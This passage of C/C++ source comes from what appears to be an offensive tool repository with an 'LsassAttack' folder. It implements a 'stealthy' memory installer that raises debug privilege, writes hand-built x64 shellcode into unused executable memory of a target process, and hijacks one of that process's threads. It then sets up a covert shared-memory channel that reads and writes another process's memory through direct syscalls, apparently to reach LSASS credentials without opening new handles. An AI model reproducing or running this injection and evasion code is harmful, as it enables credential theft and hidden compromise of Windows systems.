	// explExeName = L'e'+L'x'+L'p'+L'l'+L'o'+L'r'+L'e'+L'r'+L'.'+L'e'+L'x'+L'e';
	sharedMemName = "Global\\SMemM";
	globalMutex = "Global\\SMemMMtx";
	explExeName = L"explorer.exe";
	this->targetProcessName = targetProcessName;
	this->preferedTIDsModules = preferedTIDsModules;
    return TRUE;
}

int StealthyMemInstaller::Install() {

	if (AlreadyInstalled()) {
		// cout << "Install() failed: already installed." << endl;
        return 0;
	}

	if (InstanceAlreadyRunning()) {
        // cout << "Install() failed: Instance already running." << endl;
        return 1;
	}

    if (!SetProcessPrivilege(SE_DEBUG_NAME, TRUE)) {
        // cout << "Install() failed: Privilege failed." << endl;
        return 2;
    }
	
	if (!GetTargetProcessPID()) {
        // cout << "Install() failed: GetTargetProcessPID failed." << endl;
        return 3;
    }

    if (!GetTargetProcessHandle()) {
		// cout << "Install() failed: GetTargetProcessHandle failed." << endl;
        return 4;
	}

    if (!GetRemoteExecutableMemory()) {
		// cout << "Install() failed: GetRemoteExecutableMemory failed." << endl;
        return 5;
	}
	
	if (!FindUsableTID()) {
		// cout << "Install() failed: FindUsableTID failed." << endl;
		return 6;
	}

	if (!CreateSharedFileMapping()) {
		// cout << "Install() failed: CreateSharedFileMapping failed. " << GetLastError() <<endl;
		return 7;
	}

	if (!CreateExternalGatekeeperHandleToFileMapping()) {
		// cout << "Install() failed: Gatekeeperhandle failed." << endl;
		return 8;
	}

	if (!InjectFileMappingShellcodeIntoTargetThread()) {
        // cout << "Install() failed: ConnectFileMappingWithTargetThread failed." << endl;
		return 9;
	}
	CloseHandle(hLocalSharedMem);

	if (!InjectCommunicationShellcodeIntoTargetThread()) {
		// cout << "Install() failed: InjectCommunicationShellcodeIntoTargetThread failed." << endl;
		return 10;
	}

	WriteReconnectionInfoIntoSharedMemory();
	CleanUp();
		
    return 0;
}

BOOL StealthyMemInstaller::InstanceAlreadyRunning() {
    hGlobalMutex = CreateMutexA(NULL, TRUE, globalMutex.c_str());
	if (hGlobalMutex == NULL) {
        // something weird went wrong, we return true so the installer knows it can't continue
        return TRUE;
        
    } else if (GetLastError() == ERROR_ALREADY_EXISTS) {
        // An instance of either the installer or the client is already running, terminate now
        return TRUE; 

	}
	return FALSE;
}

BOOL StealthyMemInstaller::GetTargetProcessPID() {
	vector<DWORD> pidsTargetProcess = GetPIDsOfProcess(targetProcessName);
	if (pidsTargetProcess.empty()) {
        cout << "Install() failed: no PIDs found." << endl;
        return FALSE;
    }
    // in case the target process has multiple PIDs, take the first one
    sort(pidsTargetProcess.begin(), pidsTargetProcess.end());
    targetProcessPID = pidsTargetProcess[0];
	if (!targetProcessPID) {
        cout << "Install() failed: Invalid PID." << endl;
        return FALSE;
	}
	return TRUE;
}

BOOL StealthyMemInstaller::AlreadyInstalled() {
	hSharedMemHandle = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, sharedMemName.c_str());
	if (hSharedMemHandle) {
        return TRUE;
	}
	return FALSE;
}

BOOL StealthyMemInstaller::GetTargetProcessHandle() {
	hTargetProcess = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
        FALSE,
        targetProcessPID
    );
	if (!hTargetProcess) {
        cout << "Install() failed: Cannot open process. " << GetLastError() << endl;
        return FALSE;
	}
	return TRUE;
}

BOOL StealthyMemInstaller::GetRemoteExecutableMemory() {
	vector<UNUSED_EXECUTABLE_MEM> availableExecutableMem = FindExecutableMemory(hTargetProcess, TRUE);
    if (availableExecutableMem.empty() || 
        availableExecutableMem[0].start == nullptr || 
        availableExecutableMem[0].size == NULL ||
        availableExecutableMem[0].size <= PADDING_IN_EXECUTABLE_MEM
    ) {
        cout << "Install() failed: No avaiable mem." << endl;
        return FALSE;
    }
    remoteExecutableMem = (void*)((DWORD64)availableExecutableMem[0].start + PADDING_IN_EXECUTABLE_MEM);
	remoteExecutableMemSize = availableExecutableMem[0].size - PADDING_IN_EXECUTABLE_MEM;
	return TRUE;
}


BOOL StealthyMemInstaller::CreateSharedFileMapping() {
    hLocalSharedMem = CreateFileMappingA(
        INVALID_HANDLE_VALUE,
        NULL,
        PAGE_READWRITE | SEC_COMMIT | SEC_NOCACHE,
        0,
        sharedMemSize,
        sharedMemName.c_str()
    );
	if (!hLocalSharedMem) {
        return FALSE;
    }
		
	ptrLocalSharedMem = MapViewOfFile(hLocalSharedMem, FILE_MAP_ALL_ACCESS, 0, 0, sharedMemSize);
	if (!ptrLocalSharedMem) {
        return FALSE;
	}
	usableSharedMemSize = sharedMemSize - sizeof(SHARED_MEM_INFO);
    return TRUE;
}

vector <UNUSED_EXECUTABLE_MEM> StealthyMemInstaller::FindExecutableMemory(const HANDLE hProcess, BOOL onlyInBase) {
	MEMORY_BASIC_INFORMATION memInfo;
	vector<MEMORY_BASIC_INFORMATION> memInfos;
	vector<MEMORY_BASIC_INFORMATION> execMemInfos;
	vector<UNUSED_EXECUTABLE_MEM> freeExecutableMems;
	void* baseAddr = nullptr;
 
	if (onlyInBase) {
        baseAddr = GetProcessBaseAddress(hProcess);
        if (baseAddr == NULL) {
            return freeExecutableMems;
        }
    }
 
	// Getting all MEMORY_BASIC_INFORMATION of the target process
	unsigned char* addr = NULL;
	for (addr = NULL; VirtualQueryEx(hProcess, addr, &memInfo, sizeof(memInfo)) == sizeof(memInfo); addr += memInfo.RegionSize)
		if (!onlyInBase || (onlyInBase && memInfo.AllocationBase == baseAddr)) {
            memInfos.push_back(memInfo);
        }
	if (memInfos.empty()) {
        return freeExecutableMems;
    }
 
	// Filtering only executable memory regions
	for (int i = 0; i < memInfos.size(); ++i) {
		DWORD prot = memInfos[i].Protect;
		if (prot == PAGE_EXECUTE || prot == PAGE_EXECUTE_READ || prot == PAGE_EXECUTE_READWRITE || prot == PAGE_EXECUTE_WRITECOPY)
			execMemInfos.push_back(memInfos[i]);
	}
	if (execMemInfos.empty()) {
        return freeExecutableMems;
    }
 
	// Duplicating memory locally for analysis, finding unused memory at the end of executable regions
	for (int i = 0; i < execMemInfos.size(); ++i) {
		void* localMemCopy = VirtualAlloc(NULL, execMemInfos[i].RegionSize, MEM_COMMIT, PAGE_READWRITE);
		if (localMemCopy == NULL) {
            continue;
        }
 
		// Copying executable memory content locally
		SIZE_T bytesRead = 0;
		if (!ReadProcessMemory(hProcess, execMemInfos[i].BaseAddress, localMemCopy, execMemInfos[i].RegionSize, &bytesRead)) {
			VirtualFree(localMemCopy, execMemInfos[i].RegionSize, MEM_RELEASE);
			continue;
		}
 
		// Analyzing unused executable memory size and location locally
		BYTE currentByte = 0;
		SIZE_T unusedSize = 0;
		DWORD64 analysingByteAddr = (DWORD64)localMemCopy + execMemInfos[i].RegionSize - 1;
		while (analysingByteAddr >= (DWORD64)localMemCopy) {
			CopyMemory(&currentByte, (void*)analysingByteAddr, sizeof(BYTE));
			if (currentByte != 0) {
                break;
            }
			unusedSize++;
			analysingByteAddr--;
		}
		if (unusedSize == 0) {
			VirtualFree(localMemCopy, execMemInfos[i].RegionSize, MEM_RELEASE);
			continue;
		}
 
		UNUSED_EXECUTABLE_MEM unusedExecutableMem;
		unusedExecutableMem.regionInfo = execMemInfos[i];
		unusedExecutableMem.size = unusedSize;
		unusedExecutableMem.start = (void*)((DWORD64)execMemInfos[i].BaseAddress + execMemInfos[i].RegionSize - unusedSize);
		freeExecutableMems.push_back(unusedExecutableMem);
 
        VirtualFree(localMemCopy, execMemInfos[i].RegionSize, MEM_RELEASE);
	}
 
	return freeExecutableMems;
}

BOOL StealthyMemInstaller::FindUsableTID() {
	map<DWORD, wstring> tidsStartModules = GetTIDsModuleStartAddr(targetProcessPID);
	wstring modName = L"";
	for (int i = 0; i < preferedTIDsModules.size(); ++i) {
		for (auto const& thisTid : tidsStartModules) {
			DWORD tid = thisTid.first;
			modName = thisTid.second;
			if (modName == preferedTIDsModules[i]) {
				targetTID = tid;
				break;
			}
		}
		if (targetTID) {
			break;
		}
			
	}
	if (!targetTID) {
		return FALSE; // Could not find any of the threads starting in one of the target modules
	}
	wcout << "using: " << modName << endl;
	hTargetThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, targetTID);
	if (!hTargetThread) {
		cout << "Install()::FindUsableTID() failed: could not open thread." << endl;
		return FALSE;
	}

	return TRUE;
}


BOOL StealthyMemInstaller::CreateExternalGatekeeperHandleToFileMapping() {
	vector<DWORD> explorerPIDs = GetPIDsOfProcess(explExeName);
	if (explorerPIDs.empty()) {
		return FALSE;
	}
		
	hGateKeeperProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, explorerPIDs[0]);
	if (!hGateKeeperProcess) {
		return FALSE;
	}
	HANDLE hGateKeeper = NULL;
	if (!DuplicateHandle(
		GetCurrentProcess(), 
		hLocalSharedMem, 
		hGateKeeperProcess, 
		&hGateKeeper, 
		NULL, 
		FALSE, 
		DUPLICATE_SAME_ACCESS)
	) {
		return FALSE;
	}
	CloseHandle(hGateKeeperProcess);
	return TRUE;
}

BOOL StealthyMemInstaller::InjectFileMappingShellcodeIntoTargetThread() {
	// Getting function addresses
	FARPROC addrOpenFileMappingA = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "OpenFileMappingA");
	FARPROC addrMapViewOfFile = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "MapViewOfFile");
	FARPROC addrCloseHandle = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "CloseHandle");
	if (!addrOpenFileMappingA || !addrMapViewOfFile || !addrCloseHandle) {
		return FALSE;
	}
		
	// Get RW memory to assemble full shellcode from parts
	void* rwMemory = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (rwMemory == nullptr) {
		return FALSE;
	}
		
	DWORD64 addrEndOfShellCode = (DWORD64)rwMemory;
 
	UCHAR x64OpenFileMappingA[] = {
		0x48, 0xc7, 0xc1, 0x1f, 0, 0x0f, 0,	// mov rcx, dwDesiredAccess			+0 (FILE_MAP_ALL_ACCESS = 0xf001f @ +3)
		0x48, 0x31, 0xd2,					// xor rdx, rdx						+7 (bInheritHandle = FALSE)
		0x49, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0,	// mov r8, &lpName					+10 (&lpName +12)
		0x4d, 0x31, 0xc9,					// xor r9, r9						+20
		0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, // mov rax, addrOpenFileMappingA	+23 (addrOpenFileMappingA +25)
		0x48, 0x83, 0xec, 0x20,				// sub rsp, 0x20					+33
		0xff, 0xd0,							// call rax							+37
		0x48, 0x83, 0xc4, 0x20,				// add rsp, 0x20					+39
		0x49, 0x89, 0xc7					// mov r15, rax						+43
	};
	*(DWORD64*)((PUCHAR)x64OpenFileMappingA + 25) = (DWORD64)(ULONG_PTR)addrOpenFileMappingA;
	CopyMemory((void*)addrEndOfShellCode, x64OpenFileMappingA, sizeof(x64OpenFileMappingA));
	addrEndOfShellCode += sizeof(x64OpenFileMappingA);
 
	UCHAR x64MapViewOfFile[] = {
		0x48, 0x89, 0xc1,					// mov rcx, rax						+0
		0x48, 0xc7, 0xc2, 0x1f, 0, 0x0f, 0,	// mov rdx, dwDesiredAccess			+3 (FILE_MAP_ALL_ACCESS = 0xf001f @ +6)
		0x4d, 0x31, 0xc0,					// xor r8, r8						+10
		0x4d, 0x31, 0xc9,					// xor r9, r9						+13
		0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, // mov rax, dwNumberOfBytesToMap	+16 (dwNumberOfBytesToMap +18)
		0x50,								// push rax							+26
		0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0,	// mov rax, addrMapViewOfFile		+27 (addrMapViewOfFile +29)
		0x48, 0x83, 0xec, 0x20,				// sub rsp, 0x20					+37
		0xff, 0xd0,							// call rax							+41
		0x48, 0x83, 0xc4, 0x28,				// add rsp, 0x28					+43
		0x49, 0x89, 0xc6,					// mov r14, rax						+47
		// Writing to shared memory the virtual address in pivot process
		0x4d, 0x89, 0x36					// mov [r14], r14					+50
	};
	*(SIZE_T*)((PUCHAR)x64MapViewOfFile + 18) = (SIZE_T)(ULONG_PTR)sharedMemSize;
	*(DWORD64*)((PUCHAR)x64MapViewOfFile + 29) = (DWORD64)(ULONG_PTR)addrMapViewOfFile;
	CopyMemory((void*)addrEndOfShellCode, x64MapViewOfFile, sizeof(x64MapViewOfFile));
	addrEndOfShellCode += sizeof(x64MapViewOfFile);
 
	UCHAR x64CloseHandle[] = {
		0x4C, 0x89, 0xF9,					// mov rcx, r15						+0
		0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0,	// mov rax, addrCloseHandle			+3 (addrCloseHandle +5)
		0x48, 0x83, 0xec, 0x20,				// sub rsp, 0x20					+13
		0xff, 0xd0,							// call rax							+17
		0x48, 0x83, 0xc4, 0x20				// add rsp, 0x20					+19
	};
	*(DWORD64*)((PUCHAR)x64CloseHandle + 5) = (DWORD64)(ULONG_PTR)addrCloseHandle;
	CopyMemory((void*)addrEndOfShellCode, x64CloseHandle, sizeof(x64CloseHandle));
	addrEndOfShellCode += sizeof(x64CloseHandle);
 
	UCHAR x64InfiniteLoop[] = { 0xEB, 0xFE }; // nop + jmp rel8 -2
	CopyMemory((void*)addrEndOfShellCode, x64InfiniteLoop, sizeof(x64InfiniteLoop));
	addrEndOfShellCode += sizeof(x64InfiniteLoop);
 
	UCHAR lpNameBuffer[30];
	SecureZeroMemory(lpNameBuffer, sizeof(lpNameBuffer));
	CopyMemory(lpNameBuffer, sharedMemName.c_str(), sharedMemName.size());
	CopyMemory((void*)addrEndOfShellCode, lpNameBuffer, sizeof(lpNameBuffer));
	addrEndOfShellCode += sizeof(lpNameBuffer);
 
	SIZE_T fullShellcodeSize = addrEndOfShellCode - (DWORD64)rwMemory;
 
	DWORD64 lpNameInRemoteExecMemory = (DWORD64)remoteExecutableMem + fullShellcodeSize - sizeof(lpNameBuffer);
	CopyMemory((void*)((DWORD64)rwMemory + 12), &lpNameInRemoteExecMemory, sizeof(lpNameInRemoteExecMemory));
 
	// bool pushShellcodeStatus = PushShellcode(rwMemory, fullShellcodeSize);
	if (fullShellcodeSize > remoteExecutableMemSize) {
		return FALSE;
	}
	BOOL pushShellcodeStatus = WriteProcessMemoryAtPtrLocation(hTargetProcess, remoteExecutableMem, rwMemory, fullShellcodeSize);
	VirtualFree(rwMemory, 0, MEM_RELEASE);
	if (!pushShellcodeStatus) {
		return FALSE;
	}
	
	if (!ExecShellcodeWithHijackedThread(fullShellcodeSize - sizeof(lpNameBuffer), FALSE)) {
		return FALSE;
	} 
 
	CopyMemory(&ptrRemoteSharedMem, ptrLocalSharedMem, sizeof(void*));
	if (ptrRemoteSharedMem == nullptr) {
		return FALSE;
	}
	else {
		return TRUE;
	}
}

BOOL StealthyMemInstaller::ExecShellcodeWithHijackedThread(SIZE_T shellcodeSize = NULL, BOOL thenRestore = TRUE) {
	// Preparing for thread hijacking
	CONTEXT tcInitial;
	CONTEXT tcHiJack;
	CONTEXT tcCurrent;
	SecureZeroMemory(&tcInitial, sizeof(CONTEXT));
	tcInitial.ContextFlags = CONTEXT_ALL;
 
	// Suspend thread and send it executing our shellcode
	DWORD suspendCount = SuspendThread(hTargetThread);
	if (suspendCount > 0) {
		// The thread was already suspended
		for (int i = 0; i < suspendCount; ++i) {
			ResumeThread(hTargetThread);
		}
	}
	GetThreadContext(hTargetThread, &tcInitial);
	CopyMemory(&tcHiJack, &tcInitial, sizeof(CONTEXT)); // Faster than another call to GetThreadContext
	CopyMemory(&tcCurrent, &tcInitial, sizeof(CONTEXT));
	tcHiJack.Rip = (DWORD64)remoteExecutableMem;
	SetThreadContext(hTargetThread, &tcHiJack);
	ResumeThread(hTargetThread);
 
	if (shellcodeSize == NULL) {
		return TRUE; // Permanent thread hijack, do not wait for any execution completion
	}

	// Check the thread context to know when done executing (RIP should be at memory address + size of shellcode - 2 in the infinite loop jmp rel8 -2)
	DWORD64 addrEndOfExec = (DWORD64)remoteExecutableMem + shellcodeSize - 2;
	do {
		GetThreadContext(hTargetThread, &tcCurrent);
	} while (tcCurrent.Rip != addrEndOfExec);

	if (thenRestore) {
		// Execution finished, resuming previous operations
		SuspendThread(hTargetThread);
		SetThreadContext(hTargetThread, &tcInitial);
		ResumeThread(hTargetThread);
	}
 
	return TRUE;
}


BOOL StealthyMemInstaller::InjectCommunicationShellcodeIntoTargetThread() {
	// Pushing control structure into shared memory
	REMOTE_COMMAND_INFO controlStruct;
	void* controlLocalAddr = (void*)((DWORD64)ptrLocalSharedMem + sharedMemSize - sizeof(controlStruct));
	CopyMemory(controlLocalAddr, &controlStruct, sizeof(controlStruct));
	void* controlRemoteAddr = (void*)((DWORD64)ptrRemoteSharedMem + sharedMemSize - sizeof(controlStruct));
 
	string ntrvmNoStr = "NtReadVirtualMemory";
	string ntwvmNoStr = "NtWriteVirtualMemory";
	DWORD syscallIndexZwRVM = GetSyscallId("ntdll.dll", ntrvmNoStr);
	DWORD syscallIndexZwWVM = GetSyscallId("ntdll.dll", ntwvmNoStr);
	if (!syscallIndexZwRVM || !syscallIndexZwWVM) {
		return FALSE;
	}
 
	// Get RW memory to assemble full shellcode from parts
	void* rwMemory = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (rwMemory == nullptr) {
		return FALSE;
	}
	DWORD64 addrEndOfShellCode = (DWORD64)rwMemory;
 
	UCHAR x64Spinlock[] = {
		0xA0, 0, 0, 0, 0, 0, 0, 0, 0,	// mov al, [&exec]
		0x3c, 0,						// cmp al, 0
		0xF3, 0x90,						// pause (signals the CPU that we are in a spinlock)
		0x75, 0xF1						// jnz -14
	};
	*(DWORD64*)((PUCHAR)x64Spinlock + 1) = (DWORD64)(ULONG_PTR)controlRemoteAddr;
	CopyMemory((void*)addrEndOfShellCode, x64Spinlock, sizeof(x64Spinlock));
	addrEndOfShellCode += sizeof(x64Spinlock);
 
	UCHAR x64RaxParameter[] = {
		0x48, 0xa1, 0, 0, 0, 0, 0, 0, 0, 0	// mov rax, [&nBytesReadOrWritten]		+0 (&nBytesReadOrWritten +2)
	};
	*(DWORD64*)((PUCHAR)x64RaxParameter + 2) = (DWORD64)(ULONG_PTR)((DWORD64)controlRemoteAddr + 40);
	CopyMemory((void*)addrEndOfShellCode, x64RaxParameter, sizeof(x64RaxParameter));
	addrEndOfShellCode += sizeof(x64RaxParameter);
 
	UCHAR x64ZwRWVM[] = {
		// Preparing argument passing to NtRVM/NtWVM
		0x50,								// push rax						+0 (NumberOfBytesRead, optional)
		0x48, 0x83, 0xec, 0x28,				// sub rsp, 0x28				+1 (+8 normally the return address pushed by NtRVM call)
		0x48, 0xa1, 0, 0, 0, 0, 0, 0, 0, 0,	// mov rax, [&hProcess]			+5 (&hProcess +7)
		0x48, 0x89, 0xc1,					// mov rcx, rax					+15
		0x48, 0xa1, 0, 0, 0, 0, 0, 0, 0, 0,	// mov rax, [&lpBaseAddress]	+18 (&lpBaseAddress +20)
		0x48, 0x89, 0xc2,					// mov rdx, rax					+28
		0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0,	// mov rax, [&lpBuffer]			+31 (&lpBuffer +33)
		0x49, 0x89, 0xc0,					// mov r8, rax					+41
		0x48, 0xa1, 0, 0, 0, 0, 0, 0, 0, 0,	// mov rax, [&nSize]			+44 (&nSize +46)
		0x49, 0x89, 0xc1,					// mov r9, rax					+54
		// Loading function pointer accordingly to current order
		0xa0, 0, 0, 0, 0, 0, 0, 0, 0,		// mov al, [&order]				+57 (&order +58)
		0x3c, 0x0,							// cmp al, 0x0					+66
		0x49, 0x89, 0xCA,					// mov r10, rcx					+68
		0x75, 0x9,							// jne +9						+71
		0xb8, 0, 0, 0, 0,					// mov eax, WZWVM_SYSCALLID		+73 (WZWVM_SYSCALLID +74)
		0x0f, 0x05,							// syscall						+78
		0xeb, 0x7,							// jmp +7						+80
		0xb8, 0, 0, 0, 0,					// mov eax, WZRVM_SYSCALLID		+82 (WZRVM_SYSCALLID +83)
		0x0f, 0x05,							// syscall						+87
		0x48, 0x83, 0xC4, 0x30				// add rsp, 0x30				+89
	};
	*(DWORD64*)((PUCHAR)x64ZwRWVM + 7) = (DWORD64)(ULONG_PTR)((DWORD64)controlRemoteAddr + 16);
	*(DWORD64*)((PUCHAR)x64ZwRWVM + 20) = (DWORD64)(ULONG_PTR)((DWORD64)controlRemoteAddr + 24);
	*(DWORD64*)((PUCHAR)x64ZwRWVM + 33) = (DWORD64)(ULONG_PTR)ptrRemoteSharedMem;
	*(DWORD64*)((PUCHAR)x64ZwRWVM + 46) = (DWORD64)(ULONG_PTR)((DWORD64)controlRemoteAddr + 32);
	*(DWORD64*)((PUCHAR)x64ZwRWVM + 58) = (DWORD64)(ULONG_PTR)((DWORD64)controlRemoteAddr + 8);
	*(DWORD*)((PUCHAR)x64ZwRWVM + 74) = (DWORD)(ULONG_PTR)syscallIndexZwRVM;
	*(DWORD*)((PUCHAR)x64ZwRWVM + 83) = (DWORD)(ULONG_PTR)syscallIndexZwWVM;
	CopyMemory((void*)addrEndOfShellCode, x64ZwRWVM, sizeof(x64ZwRWVM));
	addrEndOfShellCode += sizeof(x64ZwRWVM);
 
	UCHAR x64ToggleSpinlock[] = {
		0xB0, 1,												// mov al, 1
		0xA2, 0, 0, 0, 0, 0, 0, 0, 0							// mov [&exec], al
	};
	*(DWORD64*)((PUCHAR)x64ToggleSpinlock + 3) = (DWORD64)(ULONG_PTR)controlRemoteAddr;
	CopyMemory((void*)addrEndOfShellCode, x64ToggleSpinlock, sizeof(x64ToggleSpinlock));
	addrEndOfShellCode += sizeof(x64ToggleSpinlock);
 
	// End of cycle, jump back to start
	UCHAR x64AbsoluteJump[] = {
		0x48, 0xb8,	0, 0, 0, 0, 0, 0, 0, 0,	// mov rax, m_remoteExecMem		+0 (m_remoteExecMem +2)
		0xff, 0xe0							// jmp rax								+10
	};
	*(DWORD64*)((PUCHAR)x64AbsoluteJump + 2) = (DWORD64)(ULONG_PTR)remoteExecutableMem;
	CopyMemory((void*)addrEndOfShellCode, x64AbsoluteJump, sizeof(x64AbsoluteJump));
	addrEndOfShellCode += sizeof(x64AbsoluteJump);
	
	SIZE_T fullShellcodeSize = addrEndOfShellCode - (DWORD64)rwMemory;
	// BOOL pushShellcodeStatus = PushShellcode(rwMemory, fullShellcodeSize);
	if (fullShellcodeSize > remoteExecutableMemSize) {
		return FALSE;
	}
	BOOL pushShellcodeStatus = WriteProcessMemoryAtPtrLocation(hTargetProcess, remoteExecutableMem, rwMemory, fullShellcodeSize);
	VirtualFree(rwMemory, 0, MEM_RELEASE);
	if (!pushShellcodeStatus) {
		return FALSE;
	}
	if (!ExecShellcodeWithHijackedThread()) {
		return FALSE;
	}
	else {
		return TRUE;
	}
}

DWORD StealthyMemInstaller::GetSyscallId(string strModule, string strProcName) {
	FARPROC pFunction = GetProcAddress(GetModuleHandleA(strModule.c_str()), strProcName.c_str());
	
	BYTE x64PreSyscallOpcodes[] = {
		0x4C, 0x8B, 0xD1,	// mov r10, rcx;
		0xB8				// mov eax, XXh ; Syscall ID
	};
 
	for (int i = 0; i < 4; ++i) {
		if (*(BYTE*)((DWORD64)pFunction + i) != x64PreSyscallOpcodes[i]) {
			return 0; // The function has been tampered with already...
		}
	}
 
	DWORD sysCallIndex = *(DWORD*)((DWORD64)pFunction + 4);
	return sysCallIndex;
}

void StealthyMemInstaller::WriteReconnectionInfoIntoSharedMemory() {
	// Pushes useful information into shared memory, in case the bypass has to reconnect
	CONTEXT contextEmpty;
	SecureZeroMemory(&contextEmpty, sizeof(contextEmpty));
	SHARED_MEM_INFO cfgBackup;
	cfgBackup.ptrRemoteSharedMem = ptrRemoteSharedMem;
	cfgBackup.sharedMemSize = sharedMemSize;
	cfgBackup.remoteExecMem = remoteExecutableMem;
	cfgBackup.remoteExecMemSize = remoteExecutableMemSize;
	void* endOfUsableLocalSharedMem = (void*)((DWORD64)ptrLocalSharedMem + sharedMemSize - sizeof(REMOTE_COMMAND_INFO));
	void* backupAddrInSharedMem = (void*)((DWORD64)endOfUsableLocalSharedMem - sizeof(SHARED_MEM_INFO));
	CopyMemory(backupAddrInSharedMem, &cfgBackup, sizeof(cfgBackup));
}

void StealthyMemInstaller::CleanUp() {
	if (hSharedMemHandle) {
		CloseHandle(hSharedMemHandle);
	}
	if (hTargetProcess) {
		CloseHandle(hTargetProcess);
	}
	if (hTargetThread) {
		CloseHandle(hTargetThread);
	}
	if (hLocalSharedMem) {
		CloseHandle(hLocalSharedMem);
	}
	if (ptrLocalSharedMem) {
		UnmapViewOfFile(ptrLocalSharedMem);
	}
	if (hGateKeeperProcess) {
		CloseHandle(hGateKeeperProcess);
	}
}
```

`AttackServices/LsassAttack/StealthyMemManipulatorInstaller.h`:

```h
/*
* Functionality:
* Indirectly read / write memory of a target process. To do so we inject shellcode in another process
* that does the read / write operations and writes the results in a FileMapping. We then fetch the 
* results from the FileMapping.
* Installer:
* - create an inter-process communication system without creating new handles (stealthy). to do so we:
* - create a FileMapping that will be used for communication
* - find executable zeroed memory in a given process
* - inject shellcode into the process that enables the FileMapping communication
* - use a minimalistic IPC protocol inside the FileMapping
* - use a thread of the process to execute the shellcode
* Service:
* - use the communication system that has been setup for the read / write operations
*/

#ifndef _STEALTHY_MEM_MANIPULATOR_H
#define _STEALTHY_MEM_MANIPULATOR_H

// #define SHARED_MEM_SIZE 4096
#define SHARED_MEM_SIZE 100000000 // 100mb
#define PADDING_IN_EXECUTABLE_MEM 8

#include <windows.h>
#include <string>
#include <vector>
#include <map>


using namespace std;

struct SHARED_MEM_INFO {
	SIZE_T remoteExecMemSize = NULL;
	void* remoteExecMem = nullptr;
	SIZE_T sharedMemSize = NULL;
	void* ptrRemoteSharedMem = nullptr;
};

struct UNUSED_EXECUTABLE_MEM {
	MEMORY_BASIC_INFORMATION regionInfo;
	void* start = nullptr;
	SIZE_T size = NULL;
};

struct REMOTE_COMMAND_INFO {
	DWORD64 exec = 1; // Least significant byte used to release the spinlock
	DWORD order = 0; // 0: Read, 1: Write
	NTSTATUS status = 0xFFFFFFFF;
	HANDLE hProcess = NULL;
	DWORD64 lpBaseAddress = NULL;
	SIZE_T nSize = 0;
	SIZE_T* nBytesReadOrWritten = 0;
}; // Important: Must be 8 bytes aligned, otherwise garbage data is added in the structure

class StealthyMemInstaller {
public:
    BOOL Init(vector<wstring>, wstring targetProcessName = L"");
    int Install();
    // these functions are public for testing. Make private when not testing
    BOOL InstanceAlreadyRunning();
    BOOL AlreadyInstalled();
    BOOL GetTargetProcessPID();
    BOOL GetTargetProcessHandle();
    BOOL GetRemoteExecutableMemory();
    vector <UNUSED_EXECUTABLE_MEM> FindExecutableMemory(const HANDLE, BOOL);
    BOOL FindUsableTID();
    BOOL CreateSharedFileMapping();
    BOOL CreateExternalGatekeeperHandleToFileMapping();
    BOOL InjectFileMappingShellcodeIntoTargetThread();
    BOOL ExecShellcodeWithHijackedThread(SIZE_T shellcodeSize, BOOL thenRestore);
    BOOL InjectCommunicationShellcodeIntoTargetThread();
    DWORD GetSyscallId(string strModule, string strProcName);
    void WriteReconnectionInfoIntoSharedMemory();
    void CleanUp();

    // purely for testing
    void* getPtrLocalSharedMem() {
        return ptrLocalSharedMem;
    }
    HANDLE getHGlobalMutex() {
        return hGlobalMutex;
    }

private:
    SIZE_T sharedMemSize = SHARED_MEM_SIZE;
    HANDLE hLocalSharedMem = NULL;
    void* ptrLocalSharedMem = nullptr;
    void* ptrRemoteSharedMem = nullptr;
    string sharedMemName;
    HANDLE hSharedMemHandle;
    SIZE_T usableSharedMemSize = NULL;
    string globalMutex;
    HANDLE hGlobalMutex = NULL;
    wstring targetProcessName;
    DWORD targetProcessPID;
    HANDLE hTargetProcess;
    void* remoteExecutableMem = nullptr;
    SIZE_T remoteExecutableMemSize = 0;
    vector<wstring> preferedTIDsModules;
    DWORD targetTID = NULL;
    HANDLE hTargetThread = NULL;
    wstring explExeName;
    HANDLE hGateKeeperProcess = NULL;
};

#endif
```

`AttackServices/LsassAttack/TestPivotApp.c`:

```c
#include <windows.h>
#include <stdio.h>
#include <wchar.h>
#include "../../MemWarsCore/MemWarsCore.h"

void startMemoryTestApp(void*p) {
    // system("memoryTestApp.exe");
    STARTUPINFO si;
	PROCESS_INFORMATION pi;
	
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	CreateProcess(
        TEXT("memoryTestApp.exe"),
        NULL,NULL,NULL,FALSE,
        0,
        NULL,NULL,
        &si,
        &pi
    );
}

int main(int argc, char* argv[]) {
    int value1 = 133337;
    // STARTUPINFO si;
	// PROCESS_INFORMATION pi;
	
	// ZeroMemory(&si, sizeof(si));
	// si.cb = sizeof(si);
	// ZeroMemory(&pi, sizeof(pi));
	// CreateProcess(
    //     TEXT("memoryTestApp.exe"),
    //     NULL,NULL,NULL,FALSE,
    //     0,
    //     NULL,NULL,
    //     &si,
    //     &pi
    // );
    // system("memoryTestApp.exe");
    // HANDLE process = (HANDLE)GetProcessByNameEx(TEXT("memoryTestApp.exe"), TRUE, PROCESS_QUERY_INFORMATION);
    // while (process == NULL) {
    //     process = (HANDLE)GetProcessByNameEx(TEXT("memoryTestApp.exe"), TRUE, PROCESS_QUERY_INFORMATION);
    // }
    _beginthread(startMemoryTestApp, 0, 0);
    for (;;) {
        // if (process == NULL) {
            // CreateProcess(
            //     TEXT("memoryTestApp.exe"),
            //     NULL,NULL,NULL,FALSE,
            //     0,
            //     NULL,NULL,
            //     &si,
            //     &pi
            // );
        // }
    }
}
```

